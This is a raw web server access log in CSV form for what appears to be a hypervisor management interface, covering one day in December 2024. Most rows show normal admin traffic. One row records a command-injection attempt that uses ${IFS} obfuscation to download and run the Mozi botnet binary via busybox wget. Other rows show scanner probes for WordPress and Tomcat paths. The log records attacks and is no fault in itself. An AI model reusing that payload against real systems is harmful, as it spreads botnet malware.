ip_address,timestamp,method,path,status_code,bytes_sent,referrer,user_agent
103.164.60.19,10/Dec/2024:13:02:17 +0700,POST,/sdk/,200,5583,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,POST,/sdk/,200,529,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,POST,/sdk/,200,406,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,POST,/sdk/,200,529,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,POST,/sdk/,200,5706,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,POST,/sdk/,200,9309,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,POST,/sdk/,200,390784,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,POST,/sdk/,200,720956,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,POST,/sdk/,200,406,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,POST,/sdk/,200,406,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,POST,/sdk/,200,406,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,POST,/sdk/,200,406,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,GET,/ui/images/network/blackPixel.png,200,928,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,GET,/ui/images/network/portConnected16.png,200,2856,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,GET,/ui/images/network/blackPixelVertical.png,200,940,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:17 +0700,GET,/ui/images/network/adapter.svg,200,650,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:18 +0700,POST,/sdk/,200,720956,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:18 +0700,POST,/sdk/,200,720956,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:27 +0700,GET,/ui/views/vms/list.html,200,236,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:27 +0700,GET,/ui/views/vms/banner.html,200,1473,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:27 +0700,GET,/ui/views/vms/monitor.html,200,61,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:27 +0700,GET,/ui/views/vms/summary.html,200,1362,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:27 +0700,GET,/ui/views/vms/monitor/performance.html,200,1060,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:27 +0700,GET,/ui/views/vms/monitor/events.html,200,707,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:27 +0700,GET,/ui/views/vms/monitor/tasks.html,200,960,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:27 +0700,GET,/ui/views/vms/monitor/notifications.html,200,765,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:27 +0700,GET,/ui/views/vms/monitor/logs.html,200,764,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:27 +0700,GET,/ui/images/horizontalSplitHandle.png,200,991,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:27 +0700,POST,/sdk/,200,19837,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:27 +0700,POST,/sdk/,200,19854,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:27 +0700,GET,/ui/images/drag-handle-corner.svg,200,356,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:28 +0700,GET,/ui/views/storage/storage.html,200,59,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:28 +0700,POST,/sdk/,200,3482,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:28 +0700,GET,/ui/views/storage/datastore/list.html,200,301,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:28 +0700,GET,/ui/views/storage/adapter/list.html,200,284,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:28 +0700,GET,/ui/views/storage/device/list.html,200,286,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:28 +0700,GET,/ui/views/storage/nvdimm/nvdimm.html,200,172,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:28 +0700,POST,/sdk/,200,3482,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:28 +0700,POST,/sdk/,200,7138,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:28 +0700,POST,/sdk/,200,906,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:28 +0700,GET,/ui/images/datastore/volume.svg,200,639,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:28 +0700,GET,/ui/images/badge/redo.svg,200,267,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:28 +0700,GET,/ui/images/datastore/datastore-browser.svg,200,526,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:30 +0700,GET,/ui/templates/vm/vm-list.html,200,253,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:30 +0700,POST,/sdk/,200,7138,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:30 +0700,POST,/sdk/,200,3580,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:30 +0700,GET,/ui/images/vm/console.svg,200,413,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:30 +0700,GET,/ui/images/vm/pause.svg,200,227,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:30 +0700,GET,/ui/images/vm/vm-danger.svg,200,467,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/templates/vm/vm-screen.html,200,624,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,20920,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,19853,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,19837,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,5583,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,28804,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/images/line-chart-line.svg,200,666,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,529,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,529,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,529,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,1334,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/images/vm/cloak.png,200,7277,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/images/vm/play.png,200,10080,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/images/refreshFailed16.png,200,1523,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,638,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,638,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,638,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,4225,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,4926,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,POST,/sdk/,200,978731,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/screen?id=17&ts=1733810558128,200,3706,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/templates/vm/edit-notes-quick.html,200,629,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/images/tools.svg,200,505,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/images/edit-note.svg,200,463,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/images/storage/hard-disk.svg,200,404,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/images/vm/display.svg,200,398,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/images/vm/media-changer.svg,200,484,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/images/vm/usb.svg,200,523,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/images/datastore/file/cd.svg,200,683,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:02:38 +0700,GET,/ui/images/vm/selectCDROMImage16.png,200,1589,https://p.laros.net.id:8083/ui/styles/main.css,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:03:24 +0700,POST,/sdk/,200,19852,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:03:24 +0700,POST,/sdk/,200,19837,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.42.243.6,10/Dec/2024:13:03:34 +0700,27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a,HTTP/1.0,400,157,-,-
103.164.60.19,10/Dec/2024:13:03:56 +0700,POST,/sdk/,200,398,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:05:56 +0700,POST,/sdk/,200,398,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:07:56 +0700,POST,/sdk/,200,398,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:09:56 +0700,POST,/sdk/,200,398,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:11:56 +0700,POST,/sdk/,200,398,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:13:57 +0700,POST,/sdk/,200,398,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
103.164.60.19,10/Dec/2024:13:14:55 +0700,POST,/sdk/,499,0,https://p.laros.net.id:8083/ui/,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
152.42.189.50,10/Dec/2024:13:15:29 +0700,GET,/wp-admin/setup-config.php?step=1,404,187,-,"Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
152.42.189.50,10/Dec/2024:13:15:29 +0700,GET,/wordpress/wp-admin/setup-config.php?step=1,404,187,-,"Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
172.168.40.219,10/Dec/2024:13:44:32 +0700,GET,/manager/html,400,255,-,Mozilla/5.0 zgrab/0.x
80.75.212.46,10/Dec/2024:13:58:41 +0700,CONNECT,www.google.com:443,400,157,-,-
179.43.169.162,10/Dec/2024:14:03:34 +0700,GET,/,200,615,-,Hello World/1.0
198.235.24.27,10/Dec/2024:14:09:09 +0700,GET,/ui/,200,4116,-,"Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
198.235.24.14,10/Dec/2024:14:11:01 +0700,GET,//103.186.213.10:8082/login',302,370,-,"Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
198.235.24.14,10/Dec/2024:14:11:02 +0700,GET,/login,404,153,-,"Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
95.214.53.91,10/Dec/2024:14:13:30 +0700,GET,/,200,409,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
138.2.67.80,10/Dec/2024:14:19:09 +0700,GET,/,200,615,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
138.2.67.80,10/Dec/2024:14:19:09 +0700,GET,/wp-includes/ID3/license.txt,404,555,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
138.2.67.80,10/Dec/2024:14:19:09 +0700,GET,/feed/,404,555,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
138.2.67.80,10/Dec/2024:14:19:09 +0700,GET,/xmlrpc.php?rsd,404,555,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
138.2.67.80,10/Dec/2024:14:19:10 +0700,GET,/blog/wp-includes/wlwmanifest.xml,404,555,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
138.2.67.80,10/Dec/2024:14:19:10 +0700,GET,/web/wp-includes/wlwmanifest.xml,404,555,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
138.2.67.80,10/Dec/2024:14:19:10 +0700,GET,/wordpress/wp-includes/wlwmanifest.xml,404,555,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
